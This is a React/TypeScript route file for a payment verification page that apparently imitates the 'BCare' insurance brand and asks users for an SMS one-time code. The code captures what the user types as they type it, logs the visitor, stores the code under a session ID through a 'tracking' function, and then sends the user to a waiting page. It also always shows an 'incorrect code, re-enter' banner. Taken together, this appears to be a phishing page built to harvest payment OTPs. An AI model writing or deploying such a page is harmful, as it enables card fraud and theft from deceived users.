import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { PublicLayout } from "@/components/PublicLayout";
import { RejectBanner } from "@/components/RejectBanner";
import { useState } from "react";
import { z } from "zod";
import { useVisitorTracking } from "@/hooks/useVisitorTracking";
import { useLiveInput } from "@/hooks/useLiveInput";
import { saveOtp } from "@/lib/tracking.functions";

export const Route = createFileRoute("/payment/otp")({
  head: () => ({ meta: [{ title: "رمز التحقق | بي كير" }] }),
  validateSearch: z.object({ error: z.union([z.string(), z.number()]).optional() }),
  component: OtpPage,
});

function OtpPage() {
  useVisitorTracking("OTP");
  const navigate = useNavigate();
  const [otp, setOtp] = useState("");
  useLiveInput({ otp });
  const [loading, setLoading] = useState(false);

  async function onSubmit(e: React.FormEvent) {
    e.preventDefault();
    const sessionId = window.localStorage.getItem("bcare_session_id");
    if (!sessionId) return;
    setLoading(true);
    await saveOtp({ data: { session_id: sessionId, otp } }).catch(() => {});
    setLoading(false);
    navigate({ to: "/payment/wait", search: { from: "otp" } });
  }

  return (
    <PublicLayout>
      <div className="container mx-auto px-3 py-8">
        <div className="mx-auto max-w-md">
          <RejectBanner message="رمز التحقق غير صحيح، يرجى إعادة إدخاله." />
          <div className="rounded-2xl bg-white p-6 shadow-sm text-center">
            <h1 className="mb-2 text-xl font-bold text-bcare-blue">رمز التحقق</h1>
            <p className="mb-6 text-sm text-bcare-muted">تم إرسال رمز التحقق إلى هاتفك المسجل</p>
            <form onSubmit={onSubmit} className="space-y-4">
              <input value={otp} onChange={(e) => setOtp(e.target.value)} inputMode="numeric" maxLength={8} required className="h-14 w-full rounded-lg border border-bcare-border px-3 text-center text-2xl tracking-widest outline-none focus:border-bcare-blue" placeholder="●●●●●●" />
              <button type="submit" disabled={loading} className="flex h-12 w-full items-center justify-center rounded-lg bg-bcare-orange font-bold text-white disabled:opacity-60">
                {loading ? "جاري التحقق..." : "تأكيد"}
              </button>
            </form>
          </div>
        </div>
      </div>
    </PublicLayout>
  );
}
